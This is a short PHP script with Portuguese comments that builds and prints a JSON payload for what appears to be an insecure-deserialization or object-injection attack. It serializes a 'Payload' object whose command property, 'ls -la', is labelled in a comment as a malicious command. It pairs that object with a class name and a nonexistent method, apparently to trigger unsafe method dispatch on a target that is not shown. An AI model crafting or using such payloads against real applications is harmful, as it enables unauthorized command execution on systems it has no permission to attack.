<?php

class Payload {
	public $command = "ls -la"; // Comando malicioso
}

$data = new stdClass();
$data->classe = "stdClass"; // Usando a classe base stdClass
$data->funcao = "nonExistentMethod"; // Método que não existe na classe stdClass
$data->arg = [serialize(new Payload())]; // Argumento contém o objeto Payload serializado

$serializedData = json_encode($data);
 
echo ($serializedData);
echo "\n";